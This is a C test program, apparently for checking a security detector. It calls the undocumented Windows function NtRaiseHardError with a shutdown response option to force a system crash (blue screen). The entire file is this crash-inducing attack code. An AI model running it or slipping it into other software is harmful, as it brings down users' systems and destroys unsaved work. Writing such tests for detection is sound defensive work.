#include <windows.h>
#include <stdio.h>

#define STATUS_INTERNAL_ERROR ((NTSTATUS)0xC00000E5L)

typedef LONG NTSTATUS;
typedef unsigned long ULONG;
typedef unsigned long long ULONG_PTR;
typedef ULONG_PTR* PULONG_PTR;
typedef ULONG* PULONG;

#define NTAPI __stdcall

typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response
);

int main(int argc, char* argv[]) {
    printf("[TEST] BSOD Attack Simulation\n");
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[FAIL] GetModuleHandle(ntdll.dll) failed: %lu\n", GetLastError());
        return 1;
    }
    
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (!NtRaiseHardError) {
        printf("[FAIL] GetProcAddress(NtRaiseHardError) failed: %lu\n", GetLastError());
        return 1;
    }
    
    printf("[OK] Found NtRaiseHardError at: %p\n", NtRaiseHardError);
    
    NTSTATUS status = STATUS_INTERNAL_ERROR;
    ULONG response;
    NTSTATUS result = NtRaiseHardError(status, 0, 0, NULL, 6, &response);
    
    printf("[OK] NtRaiseHardError called, result: %lu\n", result);
    printf("[TEST] BSOD simulation completed - should be detected!\n");
    
    Sleep(5000);
    return 0;
}